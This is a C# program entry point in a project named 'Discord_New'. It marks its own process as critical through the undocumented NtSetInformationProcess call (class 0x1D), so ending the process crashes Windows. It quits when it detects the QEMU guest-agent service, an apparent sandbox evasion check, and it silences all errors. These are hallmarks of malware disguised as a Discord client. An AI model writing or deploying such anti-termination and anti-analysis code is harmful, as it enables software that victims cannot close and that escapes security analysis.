using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;

namespace Discord_New
{
    internal static class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private static bool firstInstance = true;
        private static bool serviceExists = false;

        private static void Main()
        {
            try
            {
                SystemEvents.SessionEnded += new SessionEndedEventHandler(SystemEvents_SessionEnded);

               // Process.EnterDebugMode();
                NtSet(1, 0x1D);

                foreach (ServiceController sc in ServiceController.GetServices())
                {
                    if (sc.ServiceName == "QEMU-GA")
                    {
                        serviceExists = true;
                        Application.Exit();
                        break;
                    }
                }

                using (Mutex mutex = new Mutex(true, System.Diagnostics.Process.GetCurrentProcess().ProcessName, out firstInstance))
                {
                    if (firstInstance)
                    {
                        Application.EnableVisualStyles();
                        Application.SetCompatibleTextRenderingDefault(false);
                        Application.Run(new Form1());
                    }
                    else
                    {
                        // Another instance loaded
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }

        public static void NtSet(int Enabled = 1, int Flag = 0x1D)
        {
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, Flag, ref Enabled, sizeof(int));
        }

        static void SystemEvents_SessionEnded(object sender, SessionEndedEventArgs e)
        {
            NtSet(0, 0x1D);
        }
    }
}